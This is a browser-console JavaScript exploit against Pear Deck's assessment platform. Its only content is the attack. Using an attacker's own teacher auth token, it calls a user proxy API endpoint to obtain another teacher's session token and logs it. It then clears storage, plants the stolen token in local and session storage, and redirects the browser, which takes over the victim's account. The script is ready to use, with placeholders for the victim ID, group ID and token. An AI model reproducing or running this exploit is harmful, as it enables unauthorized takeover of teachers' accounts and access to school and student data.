(async function() {

    let INPUT_VICTIMID = "input teacher/victim ID here"
    let INPUT_GROUPID = "input group ID here"
    let INPUT_AUTH = "input attacker's teacher auth token here"

    
          let response = await fetch(`https://assessment.peardeck.com/api/user/proxy?userId=${INPUT_VICTIMID}&groupId=${INPUT_GROUPID}`, {
        "headers": {
          "accept": "application/json, text/plain, */*",
          "authorization": INPUT_AUTH
        },
        "method": "GET"
      })
    
          let token = await response.json()
      token = token.result.token

    if (token) {
        console.log(token)
        alert("Grabbed token successfully!");
        localStorage.clear();
        sessionStorage.clear();
      
        let userresp = await fetch("https://assessment.peardeck.com/api/user/me", {
          "headers": {
            "accept": "application/json, text/plain, */*",
            "authorization": token
          },
          "method": "GET"
        })

        userresp = await userresp.json()
        userresp = userresp.result

        var new_key = `user:${userresp._id}:role:${userresp.role}`;
        localStorage.setItem("tokens", `["${new_key}"]`);
        localStorage.setItem(new_key, token);
        sessionStorage.setItem("tokenKey", new_key);
      
        window.location.href = "https://assessment.peardeck.com/";
      }
})()
